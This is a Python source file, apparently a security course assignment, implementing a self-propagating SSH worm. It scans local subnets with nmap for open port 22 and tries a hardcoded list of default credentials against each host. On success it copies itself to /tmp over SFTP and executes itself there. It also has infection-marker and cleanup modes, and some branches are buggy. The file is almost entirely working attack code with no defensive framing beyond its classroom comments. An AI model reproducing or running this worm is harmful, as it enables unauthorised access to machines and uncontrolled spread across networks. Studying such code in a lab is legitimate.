#!/usr/bin/env python3
import os
from posix import listdir
import sys
import socket
import paramiko
import nmap
from paramiko.client import SSHClient
import netinfo
import netifaces
import socket
import fcntl
import struct
import shutil

# The list of credentials to attempt
credList = [
('root', 'toor'),
('admin', '#NetSec!#'),
('osboxes', 'osboxes.org'),
('cpsc', 'cpsc'),
('kali','kali')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem(*sshClient):
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	isInfected = False
	if not sshClient:
		return os.path.exists(INFECTED_MARKER_FILE)

	else:
		sftpClient = sshClient[0].open_sftp()
		try:
			sftpClient.stat(INFECTED_MARKER_FILE)
			isInfected = True
		except FileNotFoundError:
			print("File not Found!")
		except IOError:
			sys.exc_clear()
			isInfected = False
		
	return isInfected

#################################################################
# Marks the system as infected
#################################################################
def markInfected(*sshClient):
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	open('infected.txt', 'w+').close()
	cwd = os.getcwd()

	if not sshClient:
		os.rename(cwd + '/infected.txt', INFECTED_MARKER_FILE)
		shutil.copy(cwd + '/worm.py','/tmp/worm.py' )
	
	else:
		sftpClient = sshClient[0].open_sftp()
		sftpClient.put(cwd + '/infected.txt', INFECTED_MARKER_FILE)
		os.remove(cwd + '/infected.txt')

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.
	current = os.getcwd()
	sftpClient = sshClient.open_sftp()
	cwd = os.getcwd()
	sftpClient.put(cwd +"/worm.py", "/tmp/worm.py")
	#sftpClient.put("/tmp/infected.txt", "/tmp/infected.txt")
	sshClient.exec_command("chmod a+x /tmp/worm.py")
	sshClient.exec_command("python3 /tmp/worm.py")
	#sshClient.exec_command("chmod a+x /tmp/infected.txt")

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	try:
		sshClient.connect(hostname = host, username = userName, password = password)
		return 0
	except paramiko.AuthenticationException:
		return 1
	except paramiko.SSHException:
		return 3

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		print(f"Trying credential {username}:{password}")
		if tryCredentials(host, username, password, ssh) == 0:
			attemptResults = [ssh, username, password]
			break	
		else:
			print(f"Fail!")
			
	# Could not find working credentials
	return attemptResults

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP():
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.
	networkInterfaces = netifaces.interfaces()
	ip_address = None

	for netFace in networkInterfaces:
		address = netifaces.ifaddresses(netFace)[2][0]["addr"]

		if not address == "127.0.0.1":
			ip_address = address
			break

	return ip_address

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	port_scanner = nmap.PortScanner()
	port_scanner.scan("10.0.0.0/24", arguments="-p 22 --open")
	#port_scanner.scan("10.0.0.0/24", arguments="-sn --open")
	host_information = port_scanner.all_hosts()

	liveHost = []

	for host in host_information:
		if port_scanner[host].state() == "up":
			liveHost.append(host)

	return liveHost

#######################################################
#Extra Credit Clean function
#Reverse the spread and self-clean the worm program 
#from each host using an argument
#######################################################
def clean(*sshClient):
	
	if not sshClient:
		if isInfectedSystem():
			#listFile = listdir("/tmp/")
			#for file in listFile:
			
			os.remove(INFECTED_MARKER_FILE)
			os.remove("/tmp/worm.py")
	else:
		if isInfectedSystem(sshClient[0]):
			sftp = sshClient[0].open_sftp()
			listFile = sftp.listdir('/tmp/')
			#print(f"list of file {listFile}")
			for file in listFile:
				if file == "infected.txt" or file == 'worm.py':
					sftp.remove('/tmp/'+file)

#######################################################
#Extra Credit Multi function
#Making worm spread to another system on adj network 
#
#######################################################
def getHostsOnTheAdjacentNetwork():
	port_scanner = nmap.PortScanner()
	port_scanner.scan("10.0.1.0/24", arguments="-p 22 --open")
	#port_scanner.scan("10.0.1.0/24")
	host_information = port_scanner.all_hosts()
	liveHost = []

	for host in host_information:
		if port_scanner[host].state() == "up":
			liveHost.append(host)
	
	return liveHost


# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
if len(sys.argv) < 2:
	
	# TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice. 
	if isInfectedSystem():
		print ("The system is already infected")
	else:
		print("Now the worm infecting the system")
		markInfected()
	

	# TODO: Get the IP of the current system
	currentIPAddress = getMyIP()
	print("Current Host IP address: ", currentIPAddress)

	# Get the hosts on the same network
	networkHosts = getHostsOnTheSameNetwork()
	print("Hosts on the network: ", networkHosts)

	# TODO: Remove the IP of the current system
	# from the list of discovered systems (we
	# do not want to target ourselves!).

	networkHosts.remove(currentIPAddress)

	print ("Hosts to Attack: ", networkHosts)

	# Go through the network hosts
	for host in networkHosts:
		
		# Try to attack this host
		sshInfo =  attackSystem(host)

		print(f"Attack {host} success: {sshInfo}")
		
		# Did the attack succeed?
		if sshInfo:
			
			print ("Trying to spread")

			try:
				remotepath =  '/tmp/infected.txt'
				localpath = '/home/kali/infected.txt'
				sftpClient = sshInfo[0].open_sftp()
				sftpClient.get(remotepath, localpath)
				print ("Nothing spread because the files are already there")
			except IOError:
				print (f"This system {host} is infected")

			
			# Infect that system
			spreadAndExecute(sshInfo[0])
			
			print ("Spreading complete")
		
else:
	if(sys.argv[len(sys.argv)-1] == "-clean"):
		print("Cleaning the current host")
		clean()
		print("Currrent host is cleaned")
		currentIPAddress = getMyIP()
		networkHosts = getHostsOnTheSameNetwork()
		networkHosts.remove(currentIPAddress)

		# Go through the network hosts
		print("Now search and clean infected from hosts on the network")
		for host in networkHosts:
			print(f"Accessing host {host}")
			sshInfo =  attackSystem(host)
			if sshInfo:
				if isInfectedSystem(sshInfo[0]):
					print (f"Now removing infected files from host {host}")
					clean(sshInfo[0])
					print(f"System {host} is now cleaned")

	if(sys.argv[len(sys.argv)-1] == "-multi"):
		print("You are in multi mode")
		if isInfectedSystem():
			print ("The system is already infected")
		else:
			print("Now the worm infecting the system")
			markInfected()

		print("Getting hosts on adjacent network...")
		networkHosts = getHostsOnTheAdjacentNetwork()
		print("Hosts on adjacent network: ", networkHosts)
		
		for host in networkHosts:
			sshInfo = attackSystem(host)
			print(f"Attack {host} success: {sshInfo}")

			if sshInfo:
				print ("Trying to spread")

			try:
				remotepath =  '/tmp/infected.txt'
				localpath = '/home/kali/infected.txt'
				sftpClient = sshInfo[0].open_sftp()
				sftpClient.get(remotepath, localpath)
				print ("Nothing spread because the files are already there")
			except IOError:
				print (f"This system {host} is infected")

			# Infect that system
			spreadAndExecute(sshInfo[0])
			
			print ("Spreading complete")
			
	if (sys.argv[len(sys.argv)-2] == "-multi" and sys.argv[len(sys.argv)-1] == "-clean") :
		pass
